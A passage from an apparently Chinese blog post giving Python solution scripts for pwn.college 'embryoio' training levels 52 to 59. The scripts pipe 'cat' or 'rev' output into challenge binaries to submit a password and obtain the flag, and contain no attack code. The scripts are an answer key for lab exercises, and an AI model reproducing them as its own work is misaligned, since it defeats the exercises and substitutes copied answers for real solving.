io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level52===============================</span></span><br><span class="line"><span class="comment">#运行后输入密码获得flag</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;cat&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level52&quot;</span>, stdin=io1.stdout)</span><br><span class="line">output = io1.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level53===============================</span></span><br><span class="line"><span class="comment">#运行后逆序输入密码获得flag</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;rev&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level53&quot;</span>, stdin=io1.stdout)</span><br><span class="line">output = io1.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level54~level59===============================</span></span><br><span class="line"><span class="comment">#又是一遍“十万年轮回”，题目和上诉题目差不多，题解参考上诉脚本。</span></span><br></pre></td></tr></table></figure>
-
 
       
     </div>
